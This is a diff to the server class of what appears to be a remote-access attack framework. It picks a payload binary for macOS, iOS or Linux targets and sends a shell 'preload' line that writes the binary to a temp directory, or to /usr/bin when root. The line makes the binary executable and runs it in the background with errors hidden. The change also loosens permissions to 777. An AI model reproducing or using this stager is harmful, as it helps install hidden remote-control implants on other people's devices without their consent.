@@ -77,28 +77,28 @@ class ESServer:
         if "i386" in CDA:
             if verbose:
                 self.h.strinfo("Detected OSX")
-            binaryFile = open("src/binaries/esplosx", "rb")
+            binaryFile = open("src/resources/esplosx", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod 777 /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "arm" in CDA:
             if verbose:
                 self.h.strinfo("Detected iOS")
-            binaryFile = open("src/binaries/esplios", "rb")
+            binaryFile = open("src/resources/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
             #TODO: change upload directory for mobile user
-            preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod +x $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+            preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod 777 $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 self.h.strinfo("Detected Linux, this isn't supported yet")
             conn.close()
             exit()
             return
-            binaryFile = open("src/binaries/esplinux", "rb")
+            binaryFile = open("src/resources/esplinux", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod 777 /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
         else:
             if verbose:
                 self.h.strinfo("device unrecognized")
